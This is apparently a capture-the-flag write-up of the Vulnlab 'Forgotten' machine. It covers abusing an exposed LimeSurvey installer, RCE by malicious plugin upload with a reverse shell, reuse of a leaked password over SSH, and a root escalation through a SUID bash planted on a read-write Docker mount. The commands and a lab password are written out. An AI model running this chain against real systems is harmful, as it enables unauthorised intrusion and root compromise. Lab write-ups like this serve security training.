---
title: "Forgotten - Vulnlab Writeup"
date: 2026-04-23 00:00:00 +0000
categories: [boxes]
tags: [vulnlab, linux, easy, limesurvey, docker, suid, rce, privilege-escalation]
image:
  path: /assets/img/box/17/logo.png
  alt: Forgotten Vulnlab Machine
img_path: /assets/img/box/17/
---

![Machine Info](https://img.shields.io/badge/Difficulty-Easy-green) ![Machine Info](https://img.shields.io/badge/OS-Linux-blue)

<p align="center"> <img src="/assets/img/box/17/logo.png" width="150" alt="Forgotten Logo"/> </p>

**Platform:** Vulnlab
**OS:** Linux
**Difficulty:** Easy
**Author:** al3xx

---

## Enumeration

### Nmap

```bash
sudo nmap -sCV 10.129.234.81
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 28:c7:f1:96:f9:53:64:11:f8:70:55:68:0b:e5:3c:22 (ECDSA)
|_  256 02:43:d2:ba:4e:87:de:77:72:ce:5a:fa:86:5c:0d:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.56 (Debian)
```

Port 80 returns a 403, so we move on to directory enumeration.

### Gobuster

```bash
gobuster dir -u http://10.129.234.81/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php
```

```text
/server-status        (Status: 403) [Size: 278]
/survey               (Status: 301) [Size: 315] [--> http://10.129.234.81/survey/]
```

The `/survey` endpoint redirects us to a **LimeSurvey** installation.

---

## Foothold — Abusing LimeSurvey Installer

Navigating to `/survey/` reveals the LimeSurvey installer, still accessible after deployment.

![LimeSurvey Installer Welcome Screen](/assets/img/box/17/poc1.png)

The installer's **Configuration** step (step 4) exposes a database settings form that accepts arbitrary host, user, and password values.

![LimeSurvey Database Configuration Form](/assets/img/box/17/poc2.png)

### Setting Up a Remote Database

We point LimeSurvey at our own MySQL/MariaDB instance:

```bash
sudo systemctl start mariadb
sudo mysql -u root
```

```sql
CREATE DATABASE limesurvey CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER 'lime'@'%' IDENTIFIED BY 'lime123';
GRANT ALL PRIVILEGES ON limesurvey.* TO 'lime'@'%';
FLUSH PRIVILEGES;
EXIT;
```

```bash
sudo systemctl restart mariadb
```

Verify the service is listening on all interfaces:

```bash
ss -tlnp | grep 3306
# LISTEN 0  80  0.0.0.0:3306  0.0.0.0:*
```

After completing the installer and pointing it at our database, we can log in to the LimeSurvey admin panel with the administrator credentials we set during installation.

![LimeSurvey Administration Login](/assets/img/box/17/poc3.png)

---

## Privilege Escalation to Admin Shell — Malicious Plugin Upload

Once logged in, the admin dashboard presents several options including survey management, themes, and plugins.

![LimeSurvey Admin Dashboard](/assets/img/box/17/poc4.png)

### Attempting Theme Upload

The **Themes** section has an "Upload & install" button, which could allow uploading a malicious theme.

![LimeSurvey Themes Page](/assets/img/box/17/poc5.png)

This avenue was attempted but did not yield code execution.

### Plugin Upload — RCE

The **Plugins** page (Configuration → Plugins) also has an "Upload & install" option.

![LimeSurvey Plugins Page](/assets/img/box/17/poc6.png)

Searching for known exploits revealed a public [LimeSurvey RCE PoC](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE) that abuses the plugin upload functionality. After fixing a few lines in the PoC script, we uploaded a malicious plugin and obtained a reverse shell:

```bash
limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/Y1LD1R1M$ ls -la /
total 84
drwxr-xr-x   1 root root 4096 Dec  2  2023 .
drwxr-xr-x   1 root root 4096 Dec  2  2023 ..
-rwxr-xr-x   1 root root    0 Dec  2  2023 .dockerenv
```

We're inside a **Docker container**. Enumerating environment variables leaks credentials:

```bash
LIMESURVEY_PASS=5W5HN4K4GCXf9E
```

---

## Lateral Movement — SSH with Leaked Credentials

Testing the leaked password against the host via SSH:

```bash
ssh limesvc@10.129.234.81
# Password: 5W5HN4K4GCXf9E
```

```text
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)
limesvc@forgotten:~$ whoami
limesvc
```

We now have a shell on the **host machine** as `limesvc`.

---

## Privilege Escalation — Docker Mount Escape

Running `deepce.sh` inside the container to enumerate escape vectors:

```text
[+] Other mounts .............. Yes
/opt/limesurvey /var/www/html/survey rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro
```

The host path `/opt/limesurvey` is mounted into the container at `/var/www/html/survey` with **read-write** access, and the container runs as **root**. This lets us plant a SUID binary from inside the container that is accessible from the host.

### Planting a SUID bash

Inside the container (as root):

```bash
cp /bin/bash /var/www/html/survey/bash
chmod +s /var/www/html/survey/bash
```

On the host, confirm the SUID bit is set:

```bash
limesvc@forgotten:~$ ls -la /opt/limesurvey/bash
-rwsr-sr-x  1 root  root  1234376 Apr 23 12:01 bash
```

Execute it with the `-p` flag to preserve the effective UID:

```bash
limesvc@forgotten:~$ /opt/limesurvey/bash -p
bash-5.1# whoami
root
```

**Rooted.**
